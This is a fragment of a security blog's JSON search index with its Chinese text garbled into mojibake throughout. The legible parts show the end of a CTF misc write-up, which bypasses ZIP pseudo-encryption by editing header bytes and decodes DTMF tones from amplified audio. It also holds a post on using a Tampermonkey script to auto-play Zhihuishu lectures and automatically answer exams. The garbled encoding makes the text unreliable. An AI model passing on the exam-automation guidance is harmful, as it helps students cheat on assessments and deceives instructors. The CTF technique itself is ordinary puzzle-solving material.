å¯†çš„æ–¹æ³•ï¼šä½¿ç”¨winhexè½¯ä»¶æ‰“å¼€å‹ç¼©åŒ…ï¼Œå°†504B0304åçš„ç¬¬3ã€4ä¸ªå­—èŠ‚æ”¹ä¸º00 00ï¼Œå°†504B0102åçš„ç¬¬5ã€6ä¸ªå­—èŠ‚æ”¹ä¸º00 00å³å¯ç ´è§£ä¼ªåŠ å¯†ã€‚ ä¹‹åå†è§£å‹æ–‡ä»¶å°±ä¸ä¼šæç¤ºè¾“å…¥è§£å‹å¯†ç äº†ã€‚ éŸ³é¢‘æ–‡ä»¶åˆ†æä½¿ç”¨éŸ³é¢‘åˆ†æè½¯ä»¶Audacityæ‰“å¼€wavæ–‡ä»¶è¿›è¡Œåˆ†æã€‚ç‚¹å‡»è½¯ä»¶å·¦æ–¹å€’ä¸‰è§’ï¼Œæ¨¡å¼åˆ‡æ¢åˆ°æ³¢å½¢(db)å³å¯å‘ç°éŸ³é¢‘æ–‡ä»¶çš„å‰åéƒ½æœ‰å¬ä¸åˆ°ã€ä½†æ˜¯æœ‰åˆ†è´çš„éƒ¨åˆ†ã€‚ç„¶åæŠŠä¸­é—´çš„èƒ½å¬åˆ°çš„éƒ¨åˆ†åˆ‡æ‰ï¼Œå°†å‰©ä¸‹çš„å¬ä¸åˆ°çš„éƒ¨åˆ†å¯¼å‡ºï¼Œç„¶åæ‰“å¼€AUã€‚æ‰“å¼€AUåå¯¼å…¥æ–‡ä»¶ï¼Œçœ‹åˆ°éŸ³è½¨æ˜¯å¹³çš„ï¼Œäºæ˜¯æˆ‘ä»¬å¢åŠ åˆ†è´ã€‚ç»Ÿä¸€å¢åŠ åˆ†è´åï¼Œç”±äºå‰é¢ä¸€æ®µçš„å£°éŸ³å¤ªå°ï¼Œäºæ˜¯å¯¹å‰é¢ä¸€æ®µå•ç‹¬å¢åŠ åˆ†è´ã€‚è¿™æ ·å°±å¯ä»¥å¬æ¸…äº†ã€‚ç„¶åæ‰“å¼€æ‰‹æœºæ‹¨å·é”®ç›˜ï¼Œæ ¹æ®æ‹¨å·éŸ³ä»¥åŠä¹‹é—´çš„ç»†å¾®å·®åˆ«ï¼Œå¯ä»¥å¬å‡ºæ’­çš„å·ç ä¸º187485618521ã€‚æ ¹æ®å¼€å¤´å›¾ç‰‡ç»™çš„æç¤ºï¼Œé€šè¿‡base64åŠ å¯†åï¼Œå³å¯è·å¾—flag. é¢˜ç›®æ€»ç»“è¿™é“é¢˜æ•´ä½“æ¥è¯´ä¸éš¾ã€‚ä½†æ˜¯åœ¨éŸ³é¢‘å¤„ç†çš„æ—¶å€™å¾ˆå¤šäººæƒ³ä¸åˆ°æ‹¨å·éŸ³ä»¥åŠæ”¾å¤§ã€‚åœ¨å¬æ‹¨å·éŸ³çš„æ—¶å€™å…¶å®å¯ä»¥ç”¨ä¸€äº›å·¥å…·ï¼Œä½†æ˜¯å¯¹éŸ³é¢‘åˆ†è´çš„å¤„ç†ä»¥åŠå™ªå£°å¯èƒ½ä¼šå¯¼è‡´å·¥å…·è¯†åˆ«é”™è¯¯ã€‚æ‰€ä»¥é‡‡ç”¨ç”¨è€³æœµå¬çš„æ–¹å¼ã€‚åœ¨å¬çš„æ—¶å€™å…ˆå¬å‰äº”ä¸ªï¼Œè‡ªå·±å»æ‹¨å·æ¨¡æ‹Ÿä¸€ä¸‹ã€‚å‰äº”ä¸ªæ¯”è¾ƒå¥½ç¡®å®šã€‚ç„¶åå¬æœ€åä¸‰ä¸ª åªæœ‰4ç§ç‰¹å®šçš„é”®ä½æ‰èƒ½å½¢æˆæœ€åä¸‰ä¸ªçš„éŸ³è°ƒã€‚ç„¶åä¸¤ä¸¤ç¡®å®šä¸­é—´çš„67 89ï¼Œå¤šæ¬¡å°è¯•åå³å¯è·å¾—æ­£ç¡®çš„ç»“æœã€‚","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"}]},{"title":"å¦‚ä½•ç§‘å­¦åœ°çœ‹ç½‘è¯¾(çŸ¥åˆ°)","slug":"ç§‘å­¦çœ‹ç½‘è¯¾","date":"2020-03-06T10:08:41.000Z","updated":"2020-03-13T09:26:06.402Z","comments":true,"path":"2020/03/06/ç§‘å­¦çœ‹ç½‘è¯¾/","link":"","permalink":"https://polosec.github.io/2020/03/06/%E7%A7%91%E5%AD%A6%E7%9C%8B%E7%BD%91%E8%AF%BE/","excerpt":"","text":"ä½¿ç”¨è°·æ­Œæµè§ˆå™¨å®‰è£…æ²¹çŒ´æ’ä»¶ä» æ²¹çŒ´ä¸‹è½½é“¾æ¥ è·å–æ²¹çŒ´è„šæœ¬çš„æ’ä»¶(éœ€è¦ç§‘å­¦ä¸Šç½‘)ã€‚ä¸‹è½½åæ ¹æ®æç¤ºï¼Œå°†æ²¹çŒ´æ’ä»¶æ·»åŠ è‡³chromeæ‰©å±•ã€‚æ·»åŠ è¿‡åå°±å¯ä»¥åœ¨åœ°å€æ å³ä¾§çœ‹åˆ°è¿™ä¸ªå›¾æ ‡ï¼šä»£è¡¨å®‰è£…æˆåŠŸã€‚æ— éœ€ç§‘å­¦ä¸Šç½‘çš„æ–¹æ³•ï¼šä»å¢™å†…é“¾æ¥è·å–æ²¹çŒ´è„šæœ¬.CRXæ–‡ä»¶ï¼Œç„¶ååœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥chrome://extensions æ·»åŠ .crxæ–‡ä»¶ã€‚è¯¦ç»†æ·»åŠ æ•™ç¨‹è½¬è‡ªChromeå®‰è£…CRXæ’ä»¶æ–¹æ³• è·å–çœ‹ç½‘è¯¾è„šæœ¬éšåå•å‡»è¯¥å›¾æ ‡ï¼Œé€‰æ‹©è·å–æ–°è„šæœ¬ã€‚ç‚¹å‡»ç¬¬äºŒä¸ªâ€GreasyForkâ€ã€‚è¿›å…¥åæœç´¢â€æ™ºæ…§æ ‘ç½‘è¯¾åŠ©æ‰‹â€å•å‡»è¿›å…¥åï¼Œé€‰æ‹©å®‰è£…ã€‚å®‰è£…åæ˜¯è¿™æ ·ï¼šéšåæ‰“å¼€ç½‘è¯¾ç³»ç»Ÿï¼Œç™»é™†åç‚¹å¼€éœ€è¦çœ‹çš„ç½‘è¯¾å¯è‡ªåŠ¨1.5å€é€Ÿé™éŸ³æ’­æ”¾ã€‚ è‡ªåŠ¨è€ƒè¯•è¯¥è„šæœ¬æœ€å¥½çš„åŠŸèƒ½(ä¸ªäººè®¤ä¸º)æ˜¯è‡ªåŠ¨è€ƒè¯•åŠŸèƒ½ã€‚ä½¿ç”¨æ–¹æ³•ï¼šé€‰æ‹©ç« èŠ‚ä½œä¸š/è€ƒè¯•ï¼Œç‚¹è¿›å»åè„šæœ¬ä¼šè‡ªåŠ¨æœç´¢é¢˜ç›®ç­”æ¡ˆå¹¶ä¸”è‡ªåŠ¨é€‰æ‹©ï¼Œç­‰æ‰€æœ‰ç­”æ¡ˆæ£€ç´¢å®Œæ¯•åæäº¤å³å¯ã€‚ åæ§½æ™ºæ…§æ ‘å¹³å°ä¸ªäººæ„Ÿè§‰ä¸€èˆ¬ã€‚1.ç™»é™†æ—¶ç•Œé¢ä¸å¤Ÿäººæ€§åŒ–ï¼Œè€Œä¸”é€‰æ‹©å­¦å·ç™»é™†æ—¶ï¼Œé€‰æ‹©å­¦æ ¡ï¼Œè¾“å…¥å®Œå­¦å·å¯†ç åæŒ‰å›è½¦ç™»å½•ä¼šè·³è½¬åˆ°æ‰‹æœºå·ç™»å½•ã€‚å†æ¬¡é€‰æ‹©å­¦å·ç™»å½•æ‰èƒ½æ­£å¸¸ç™»å½•ã€‚2.æˆç»©åˆ†æç•Œé¢ çœ‹è¯¾ä¹ æƒ¯æ—¶é—´è½´é€†åºã€‚åšè¿™ä¸ªå›¾çš„ç¨‹åºå‘˜èµ·å¤œçº§æå§ :)ã€‚","categories":[],"tags":[{"name":"æ‚é¡¹","slug":"æ‚é¡¹","permalink":"https://polosec.github.io/tags/%E6%9D%82%E9%A1%B9/"}]}],"categories":[{"name":"git","slug":"git","permalink":"https://polosec.github.io/categories/git/"},{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"},{"name":"webåŸºç¡€","slug":"webåŸºç¡€","permalink":"https://polosec.github.io/categories/web%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"çº¢é˜ŸæŠ€èƒ½","slug":"çº¢é˜ŸæŠ€èƒ½","permalink":"https://polosec.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"},{"name":"awd","slug":"awd","permalink":"https://polosec.github.io/tags/awd/"},{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"å–è¯","slug":"å–è¯","permalink":"https://polosec.github.io/tags/%E5%8F%96%E8%AF%81/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://polosec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"https://polosec.github.io/tags/ctf/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"},{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"https://polosec.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"ç½‘ç»œ","slug":"ç½‘ç»œ","permalink":"https://polosec.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"},{"name":"mysql","slug":"mysql","permalink":"https://polosec.github.io/tags/mysql/"},{"name":"c++","slug":"c","permalink":"https://polosec.github.io/tags/c/"},{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://polosec.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"cè¯­è¨€","slug":"cè¯­è¨€","permalink":"https://polosec.github.io/tags/c%E8%AF%AD%E8%A8%80/"},{"name":"linux","slug":"linux","permalink":"https://polosec.github.io/tags/linux/"},{"name":"git","slug":"git","permalink":"https://polosec.github.io/tags/git/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"},{"name":"æ‚é¡¹","slug":"æ‚é¡¹","permalink":"https://polosec.github.io/tags/%E6%9D%82%E9%A1%B9/"}]}